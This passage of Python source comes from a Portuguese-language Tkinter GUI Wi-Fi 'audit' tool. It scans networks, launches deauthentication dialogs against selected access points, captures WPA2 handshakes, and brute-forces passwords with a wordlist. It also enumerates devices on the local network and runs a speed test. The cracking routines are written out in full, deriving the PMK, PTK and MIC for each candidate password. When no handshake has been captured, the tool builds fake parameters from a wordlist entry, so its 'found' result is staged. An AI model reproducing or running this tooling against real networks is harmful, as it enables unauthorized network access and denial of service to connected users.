        self.btn_scan.config(state='normal', text="BUSCAR REDES")
        self.lbl_st.config(text=f"{len(redes)} REDES", fg=C["verde"])
        self.log_r(f"[SCAN] {len(redes)} rede(s) encontrada(s)", "info")

    def _sel_rede(self, _=None):
        sel = self.listbox.curselection()
        if not sel or sel[0] >= len(self.redes):
            return
        self.rede_sel = self.redes[sel[0]]
        ssid = self.rede_sel["ssid"]
        sinal = self.rede_sel["sinal"]
        canal = self.rede_sel["canal"]
        bssid = self.rede_sel.get("bssid", "?")
        auth = self.rede_sel.get("auth", "WPA2")

        self.lbl_rede_nome.config(text=ssid)
        self.lbl_rede_det.config(
            text=f"BSSID: {bssid}   Canal: {canal}   Sinal: {sinal}%   {auth}")
        self.lbl_info_rede.config(text=f"{bssid}  CH:{canal}")
        self.lbl_alvo.config(text=ssid)

        for b in (self.btn_auditar, self.btn_descon, self.btn_disp,
                  self.btn_iniciar, self.btn_deauth2):
            b.config(state='normal')

    # ─── NAVEGACAO ───────────────────────────────────────────
    def _ir_auditoria(self):
        self.nb.select(1)

    def _ir_dispositivos(self):
        self.nb.select(3)


    # ─── AUDITORIA WPA2 ──────────────────────────────────────
    def _iniciar(self):
        if not self.rede_sel or self.rodando:
            return
        ssid = self.rede_sel["ssid"]
        wl = self._wordlist()
        if not wl:
            messagebox.showwarning("Wordlist", "Lista de senhas vazia.")
            return

        self.parar_flag = False
        self.rodando = True
        self.velocs = []
        self.canvas_g.delete("all")

        self.log_aud.config(state='normal')
        self.log_aud.delete('1.0', tk.END)
        self.log_aud.config(state='disabled')

        self.btn_iniciar.config(state='disabled')
        self.btn_parar.config(state='normal')
        self.lbl_st.config(text="AUDITANDO", fg=C["amarelo"])
        self.t0 = time.time()
        self._tick()
        threading.Thread(target=self._audit_wpa2,
                         args=(ssid, wl), daemon=True).start()

    def _parar(self):
        self.parar_flag = True
        self.btn_parar.config(state='disabled')

    def _audit_wpa2(self, ssid, wordlist):
        hs = self.hs_atual

        self.log_a("=" * 52, "dim")
        self.log_a(f"  AUDITORIA WPA2  |  {ssid}", "info")
        self.log_a(f"  {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "dim")
        self.log_a("=" * 52, "dim")

        if hs and hs.get("mic_real"):
            self.log_a("Usando handshake capturado.", "ok")
            mac_ap = hs["mac_ap"]
            mac_cli = hs["mac_cli"]
            anonce = hs["anonce"]
            snonce = hs["snonce"]
            eapol_d = hs["eapol"]
            mic_alvo = hs["mic_real"]
        else:
            if hs:
                self.log_a("Handshake sem MIC. Usando derivacao local.", "aviso")
            else:
                self.log_a("Nenhum handshake capturado.", "aviso")
                self.log_a("Gerando parametros para teste de dicionario.", "info")
            mac_ap = os.urandom(6)
            mac_cli = os.urandom(6)
            anonce = os.urandom(32)
            snonce = os.urandom(32)
            eapol_d = os.urandom(121)
            alvo = wordlist[len(wordlist) // 2]
            p = pmk(alvo, ssid)
            p2 = ptk(p, mac_ap, mac_cli, anonce, snonce)
            mic_alvo = mic(p2[:16], eapol_d)
            self.log_a("Para auditoria real: capture o handshake.", "aviso")

        self.log_a(f"Testando {len(wordlist)} senhas...", "info")
        self.log_a("-" * 52, "dim")

        encontrada = None
        i = 0

        for i, senha in enumerate(wordlist, 1):
            if self.parar_flag:
                break
            pct = (i / len(wordlist)) * 100
            self.root.after(0, self._upd_barra, pct, i, len(wordlist))

            t0 = time.time()
            p = pmk(senha, ssid)
            p2 = ptk(p, mac_ap, mac_cli, anonce, snonce)
            m2 = mic(p2[:16], eapol_d)
            ms = (time.time() - t0) * 1000
            self.velocs.append(ms)
            self.root.after(0, self._graf)

            if m2 == mic_alvo:
                encontrada = senha
                self.log_a(f"  [{i}/{len(wordlist)}] {senha:<22} ENCONTRADA! ({ms:.0f}ms)", "ok")
                break
            else:
                if i <= 10 or i % 20 == 0 or i == len(wordlist):
                    self.log_a(f"  [{i}/{len(wordlist)}] {senha:<22} ({ms:.0f}ms)", "dim")
            time.sleep(0.02)

        elapsed = time.time() - self.t0
        self.t0 = None
        self.rodando = False

        self.log_a("=" * 52, "dim")
        if encontrada:
            self.log_a(f"  SENHA: {encontrada}", "ok")
            self.log_a(f"  Tempo: {elapsed:.1f}s  |  Testadas: {i}/{len(wordlist)}", "ok")
            self.root.after(0, lambda: self.lbl_st.config(
                text="SENHA ENCONTRADA", fg=C["verde"]))
            self.root.after(0, lambda: messagebox.showinfo(
                "Resultado",
                f"Rede: {ssid}\nSenha: {encontrada}\n"
                f"Tempo: {elapsed:.1f}s\nTestadas: {i}/{len(wordlist)}"))
        else:
            if self.parar_flag:
                self.log_a(f"  Interrompido em {i}/{len(wordlist)}", "aviso")
            else:
                self.log_a("  Senha nao encontrada na wordlist.", "erro")
                self.log_a("  Dica: carregue uma wordlist maior.", "info")
            self.root.after(0, lambda: self.lbl_st.config(
                text="FINALIZADO", fg=C["texto_dim"]))

        self.root.after(0, self._reabilitar)


    # ─── DEAUTH ──────────────────────────────────────────────
    def _deauth_rapido(self):
        if not self.rede_sel:
            return
        req = checar_requisitos_avancados()
        if req:
            aviso_requisitos(self.root, req)
            return
        DialogoDeauth(self.root, self.rede_sel, self.var_iface, self.log)

    # ─── HANDSHAKE ───────────────────────────────────────────
    def _hs_da_rede(self):
        if not self.rede_sel:
            messagebox.showinfo("Info", "Selecione uma rede na aba REDES.")
            return
        self.hs["bssid"].set(self.rede_sel.get("bssid", ""))
        self.hs["canal"].set(self.rede_sel.get("canal", "6"))

    def _capturar_hs(self):
        req = checar_requisitos_avancados()
        if req:
            aviso_requisitos(self.root, req)
            return

        bssid = self.hs["bssid"].get().strip()
        canal = self.hs["canal"].get().strip()
        iface = self.var_iface.get().strip()
        try:
            timeout = int(self.hs["timeout"].get())
        except ValueError:
            timeout = 60

        if not bssid or not iface:
            messagebox.showwarning("Campos", "Preencha BSSID e Adaptador.")
            return

        self.btn_cap.config(state='disabled', text="Capturando...")
        self.lbl_hs_st.config(
            text=f"Capturando de {bssid}  CH:{canal}  por {timeout}s...",
            fg=C["amarelo"])

        def t():
            h = capturar_handshake(bssid, canal, iface, timeout, self.log_h)
            self.root.after(0, self._hs_resultado, h)
        threading.Thread(target=t, daemon=True).start()

    def _hs_resultado(self, hs):
        self.btn_cap.config(state='normal', text="CAPTURAR HANDSHAKE")
        if hs:
            self.hs_atual = hs
            n = hs.get("npkts", 0)
            arq = hs.get("cap") or "N/A"
            msg = f"Handshake capturado! {n} pacotes EAPOL"
            if arq != "N/A":
                msg += f"\nArquivo: {arq}"
            self.lbl_hs_st.config(text=msg, fg=C["verde"])
            self.lbl_hs_info.config(text=f"Capturado ({n} pkts)", fg=C["verde"])
            self.btn_analisar.config(state='normal')
        else:
            self.hs_atual = None
            self.lbl_hs_st.config(text="Handshake nao capturado.", fg=C["vermelho"])
            self.btn_analisar.config(state='disabled')

    def _deauth_hs(self):
        req = checar_requisitos_avancados()
        if req:
            aviso_requisitos(self.root, req)
            return
        bssid = self.hs["bssid"].get().strip()
        if not bssid:
            messagebox.showwarning("BSSID", "Informe o BSSID.")
            return
        r_temp = {"ssid": bssid, "bssid": bssid,
                  "canal": self.hs["canal"].get(), "sinal": 0}
        DialogoDeauth(self.root, r_temp, self.var_iface, self.log_h)

    def _hs_analisar(self):
        hs = self.hs_atual
        if not hs:
            messagebox.showinfo("Sem handshake", "Capture um handshake primeiro.")
            return
        ssid = (self.rede_sel or {}).get("ssid", "")
        if not ssid:
            ssid = simpledialog.askstring("SSID", "Nome da rede:") or ""
        if not ssid:
            return
        wl = self._wordlist()
        if not wl:
            return

        self.btn_analisar.config(state='disabled', text="Analisando...")
        self.log_h(f"Analisando {len(wl)} senhas...", "info")

        def t():
            enc = None
            for i, s in enumerate(wl, 1):
                try:
                    p = pmk(s, ssid)
                    p2 = ptk(p, hs["mac_ap"], hs["mac_cli"],
                             hs["anonce"], hs["snonce"])
                    m2 = mic(p2[:16], hs["eapol"])
                    if hs.get("mic_real") and m2 == hs["mic_real"]:
                        enc = s
                        self.log_h(f"[{i}/{len(wl)}] {s}  SENHA CORRETA!", "ok")
                        break
                    if i % 25 == 0:
                        self.log_h(f"[{i}/{len(wl)}] testando...", "dim")
                except Exception:
                    continue
            self.root.after(0, self._hs_fim, enc, len(wl))
        threading.Thread(target=t, daemon=True).start()

    def _hs_fim(self, enc, total):
        self.btn_analisar.config(state='normal',
                                 text="ANALISAR HANDSHAKE COM WORDLIST")
        if enc:
            messagebox.showinfo("Encontrada!", f"Senha: {enc}\nTestado: {total}")
        else:
            messagebox.showinfo("Resultado",
                                f"Nao encontrada em {total} entradas.")


    # ─── DISPOSITIVOS ────────────────────────────────────────
    def _varrer_disp(self):
        self.btn_varrer.config(state='disabled', text="BUSCANDO...")
        self.lbl_disp_total.config(text="")
        self.tree.delete(*self.tree.get_children())
        self.log_d("Identificando rede...", "info")

        def t():
            gw, base = _gateway_e_rede()
            self.log_d(f"Gateway: {gw}  |  Rede: {base}.0/24", "info")
            devs = escanear_dispositivos(base, self.log_d)
            self.root.after(0, self._mostrar_disp, devs)
        threading.Thread(target=t, daemon=True).start()

    def _mostrar_disp(self, devs):
        self.btn_varrer.config(state='normal', text="BUSCAR DISPOSITIVOS")
        self.lbl_disp_total.config(text=f"{len(devs)} dispositivo(s)")
        for d in devs:
            nome = d.get("host", "") or d.get("fab", "Desconhecido")
            self.tree.insert("", "end", values=(
                d["ip"], d["mac"], d.get("fab", "Desconhecido"), nome))
        self.log_d(f"{len(devs)} dispositivo(s) na rede.", "ok")

    # ─── VELOCIDADE ──────────────────────────────────────────
    def _testar_velocidade(self):
        self.btn_vel_testar.config(state='disabled', text="Testando...")
        self.barra_vel.start(12)
        self.v_dl.set("..."); self.v_ul.set("..."); self.v_ping.set("...")
        self.lbl_vel_st.config(text="Teste em andamento...", fg=C["amarelo"])

        def t():
            res = testar_velocidade(self.log_v)
            self.root.after(0, self._velocidade_resultado, res)
        threading.Thread(target=t, daemon=True).start()

    def _velocidade_resultado(self, res):
        self.barra_vel.stop()
        self.btn_vel_testar.config(state='normal', text="TESTAR VELOCIDADE")
        dl = res.get("download", 0)
        ul = res.get("upload", 0)
        ping = res.get("ping", 0)
        serv = res.get("servidor", "?")
        met = res.get("metodo", "?")
        self.v_dl.set(f"{dl:.1f}")
        self.v_ul.set(f"{ul:.1f}")
        self.v_ping.set(f"{ping:.0f}")
        self.lbl_vel_st.config(text=f"Servidor: {serv}  |  Metodo: {met}",
                               fg=C["texto_dim"])
        self.log_v(f"DL: {dl:.1f} Mbps | UL: {ul:.1f} Mbps | Ping: {ping:.0f}ms", "ok")

    # ─── WORDLIST ────────────────────────────────────────────
    def _wordlist(self):
        txt = self.txt_wl.get('1.0', tk.END).strip()
        return [l.strip() for l in txt.split("\n")
                if l.strip() and len(l.strip()) >= 8]

    def _wl_carregar(self):
        p = filedialog.askopenfilename(
            filetypes=[("Texto", "*.txt"), ("Todos", "*.*")])
        if not p:
            return
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                linhas = [l.strip() for l in f if l.strip()]
            self.txt_wl.delete('1.0', tk.END)
            self.txt_wl.insert('1.0', "\n".join(linhas))
            self.lbl_wl_hdr.config(
                text=f"Carregado: {os.path.basename(p)} ({len(linhas)} senhas)")
            self.lbl_wl_info.config(
                text=f"{len(linhas)} senhas ({os.path.basename(p)})")
            self.log(f"[WL] {len(linhas)} senhas carregadas.", "ok")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def _wl_interna(self):
        self.txt_wl.delete('1.0', tk.END)
        self.txt_wl.insert('1.0', "\n".join(WORDLIST))
        self.lbl_wl_hdr.config(text=f"Lista interna ({len(WORDLIST)} senhas)")
        self.lbl_wl_info.config(text=f"{len(WORDLIST)} senhas (interna)")

    def _wl_adicionar(self):
        win = tk.Toplevel(self.root)
        win.title("Adicionar senhas")
        win.geometry("400x280")
        win.configure(bg=C["fundo"])
        win.grab_set()
        tk.Label(win, text="Uma senha por linha (min 8 caracteres):",
                 font=("Consolas", 9, "bold"),
                 bg=C["fundo"], fg=C["texto"]).pack(anchor='w', padx=16, pady=(12, 4))
        txt = scrolledtext.ScrolledText(win, font=("Consolas", 9),
                                        bg=C["fundo3"], fg=C["texto"],
                                        insertbackground=C["texto"], relief='flat')
        txt.pack(fill='both', expand=True, padx=16, pady=(0, 8))

        def add():
            novas = [l.strip() for l in txt.get('1.0', tk.END).split("\n")
                     if l.strip() and len(l.strip()) >= 8]
            atual = self.txt_wl.get('1.0', tk.END).strip()
            self.txt_wl.delete('1.0', tk.END)
            self.txt_wl.insert('1.0', (atual + "\n" + "\n".join(novas)).strip())
            self.log(f"[WL] {len(novas)} senhas adicionadas", "ok")
            win.destroy()

        tk.Button(win, text="ADICIONAR", font=("Consolas", 10, "bold"),
                  bg=C["verde_dim"], fg="#fff", relief='flat',
                  cursor='hand2', pady=6, command=add).pack(fill='x', padx=16, pady=(0, 12))

    def _wl_salvar(self):
        p = filedialog.asksaveasfilename(defaultextension=".txt",
                                         filetypes=[("Texto", "*.txt")])
        if not p:
            return
        with open(p, "w", encoding="utf-8") as f:
            f.write(self.txt_wl.get('1.0', tk.END))
        self.log(f"[WL] Salvo em {p}", "ok")

    # ─── LOG ─────────────────────────────────────────────────
    def _log_limpar(self):
        self.log_full.config(state='normal')
        self.log_full.delete('1.0', tk.END)
        self.log_full.config(state='disabled')

    def _log_salvar(self):
        p = filedialog.asksaveasfilename(defaultextension=".txt",
                                         filetypes=[("Texto", "*.txt")])
        if not p:
            return
        with open(p, "w", encoding="utf-8") as f:
            f.write(self.log_full.get('1.0', tk.END))
        messagebox.showinfo("Salvo", f"Log salvo em:\n{p}")

    # ─── AUXILIARES ──────────────────────────────────────────
    def _cfg_adapter(self):
        DialogoAdapter(self.root, self.var_iface, self.log)

    def _upd_barra(self, pct, cur, total):
        self.barra['value'] = pct
        self.lbl_prog.config(text=f"Testando {cur}/{total} ({pct:.0f}%)")

    def _tick(self):
        if self.t0:
            s = int(time.time() - self.t0)
            m, s = divmod(s, 60)
            self.lbl_tempo.config(text=f"{m:02d}:{s:02d}")
            self.root.after(500, self._tick)

    def _graf(self):
        self.canvas_g.delete("all")
        if not self.velocs:
            return
        w = self.canvas_g.winfo_width() or 500
        h = 56
        n = min(len(self.velocs), int(w / 3))
        d = self.velocs[-n:]
        mx = max(d) or 1
        lw = max(1, w / n)
        for i, v in enumerate(d):
            x = i * lw
            a = (v / mx) * (h - 4)
            cor = (C["verde"] if v < mx * .6 else
                   C["amarelo"] if v < mx * .85 else C["vermelho"])
            self.canvas_g.create_rectangle(x, h - a, x + lw - 1, h,
                                           fill=cor, outline="")

    def _reabilitar(self):
        self.btn_iniciar.config(state='normal')
        self.btn_parar.config(state='disabled')
        self.btn_scan.config(state='normal')



# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    try:
        import ctypes
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    except Exception:
        pass
    root = tk.Tk()
    App(root)
    root.mainloop()
